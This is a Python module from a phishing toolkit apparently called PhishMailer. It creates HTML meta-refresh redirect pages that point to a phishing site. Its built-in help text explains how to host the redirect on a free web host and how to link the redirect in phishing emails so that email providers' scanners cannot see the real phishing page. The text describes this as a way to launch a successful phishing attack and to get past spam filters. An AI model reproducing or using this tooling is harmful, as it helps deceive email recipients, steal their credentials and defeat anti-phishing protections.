import os
import sys
from .color import green, white, red, blue, start, alert, numbering

def RedirectHelp():

	print(numbering(1) + white + " Create Redirect Page " + numbering(1))
	print(numbering(2) + white + " Info And HowTo Use " + numbering(2))
	print(numbering(99) + white + " Quit Redirecting Creation " + numbering(99)) 
	OptionPick = int(input(green + "root@phishmailer/Bypass/Redirect:~ " + white))
	if OptionPick == 1:
		os.system("clear")
		RedirectCreator()
	elif OptionPick == 2:
		os.system("clear")
		HowInfo()
	elif OptionPick == 99:
		print("Ok...")
	else: 
		print("Wrong Input!")

def RedirectionMain():
	print(green)
	print(""" 
 __   ___  __     __   ___  __  ___  __   __  
|__) |__  |  \ | |__) |__  /  `  |  /  \ |__) 
|  \ |___ |__/ | |  \ |___ \__,  |  \__/ |  \ 
-------------------MainMenu------------------""")
	RedirectHelp()

def RedirectCreator():
	print(green + """ 
 __   ___  __     __   ___  __  ___  __   __  
|__) |__  |  \ | |__) |__  /  `  |  /  \ |__) 
|  \ |___ |__/ | |  \ |___ \__,  |  \__/ |  \ 
-------------------Creator-------------------""")
	print("")
	print(numbering(1) + white + " Already With Your PhishingLink " + numbering(1))
	print(numbering(2) + white + " Add It YourSelf (just the htmlFile Without PhishingUrl) " + numbering(2))
	print(numbering(99) + white + " Quit Creation " + numbering(99))
	Creator = int(input(green + "root@phishmailer/Redirect/Creator:~ " + white))
	
	if Creator == 1:
		Url = input(start + "Enter Your Url: " + white)
		FileName = input(start + "Name Of File: " + white)
		print(alert + " Enter for '/root/Desktop/PhishMailer/Redirection/'")
		FileSave = input(start + " Where Do You Want To Save The File?: " + white)
		if FileSave == "":
			 FileLocation = "/root/Desktop/PhishMailer/Redirection/"
		else:
			FileLocation = FileSave	 	
		CompleteLocator = os.path.join(FileLocation, FileName+".html")
		Html_file = open(CompleteLocator,"w")
		Html_file.write("""
		<!DOCTYPE html>
		<html>
		<head>
			<title>Redirecting</title>
			<meta http-equiv="refresh" content="1; url={}">
		</head>
		<body>
			<p>Redirecting....</p>
		</body>
		</html> """.format(Url))
		Html_file.close()
		print(alert + " File Created, Saved At: " + FileLocation)
		
	elif Creator == 2:
		FileName = input(start + "Name Of File: " + white)
		print(alert + " Enter for '/root/Desktop/PhishMailer/Redirection/'")
		FileSave = input(start + " Where Do You Want To Save The File?: " + white)
		if FileSave == "":
			 FileLocation = "/root/Desktop/PhishMailer/Redirection/"
		else:
			FileLocation = FileSave	 	
		CompleteLocator = os.path.join(FileLocation, FileName+".html")
		Html_file = open(CompleteLocator,"w")
		Html_file.write("""
		<!DOCTYPE html>
		<html>
		<head>
			<title>Redirecting</title>
			<meta http-equiv="refresh" content="1; url=https://www.PhishingSite.com/">
		</head>
		<body>
			<p>Redirecting....</p>
		</body>
		</html> """)
		Html_file.close()
		
		print(alert + " HTML File Saved At " + FileLocation)
		print(alert + " Remember You Need To Enter Your PhishingUrl Manually!")
		
	elif Creator == 99:
		os.system("clear")
		print(red + "Hope It Works Out Another Way")
		os.system("clear")
	
	else:
		print("OK...")

def HowInfo():
	print(green)
	print(""" 
 __   ___  __     __   ___  __  ___  __   __  
|__) |__  |  \ | |__) |__  /  `  |  /  \ |__) 
|  \ |___ |__/ | |  \ |___ \__,  |  \__/ |  \ 
----------------Info And HowTo---------------""")
	print(numbering(1) + white + " How To Use " + numbering(1))
	print(numbering(2) + white + " How It Works " + numbering(2))
	print(numbering(3) + white + " To Creator " + numbering(3))
	print(numbering(99) + white + " Exit " + numbering(99))
	
	OptionPick = int(input(green + "root@phishmailer/Bypass/Redirect/Help:~ " + white))
	
	if OptionPick == 99:
		RedirectCreator()
	elif OptionPick == 1:
		print(numbering(1) + white + " Create The Redirection Html File And Make Sure You Type In Your URL Correctly \n")
		print(numbering(2) + white + " Now You Need A Hosting Service Like 000Webhost (They Will Not Block This) \n")
		print(numbering(3) + white + " Upload Your Redirection Page Recommend That You Name This 'index.html' So It Will Run automatically \n")
		print(numbering(4) + white + " And When You Create Your Phishing Email Be Sure That You Put In The Url To Your Redirection Site And Not Your Phishing Url \n")
		print(numbering(5) + white + " When You Send Your Phishing Email Now The Email Service can't 'Read' Your Phishing Site That Is Connected Too The Email \n")
		print(start + white + " This Will Make It A Little harder For Them To Flag The Email")
		RedirectionMain()
	
	elif OptionPick == 2:
		print(numbering(1) + white + " One Way That Your Emails Get Flaged Is Because The Email Service Provider Scans All The Sites That Is Connected To The Email \n")
		print(numbering(2) + white + " So When You Put In A Url That Just Redirects The Target To The Real Phishing Site It Will Not Read The Phishing Site Just the Redirection \n")
		print(numbering(3) + white + " This Is One Way To Help You Launch A successful Phishing Attack \n")
		print(alert + white + " This Is Not The Only Way They Detect Phishing Emails So It Won't Always Works But It Help Me Out In The Beginning \n")
		print(start + white + " I Will Come With More Ways To Try Bypass The Spam Filters")
		RedirectionMain()
	
	elif OptionPick == 3:
		os.system("clear")
		RedirectCreator()
		
	else:
		print(start + " Hope I See You Soon Again " + start)
		sys.exit()



                                             



#HtmlKod:
	
#<!DOCTYPE html>
#<html>
#  <head>
#      <title>HTML Meta Tag</title>
#      <meta http-equiv = "refresh" content = "1; url = https://www.PhishingSite.com />
#   </head>
#   <body>
#      <p>Redirecting....</p>
#   </body>
#</html>
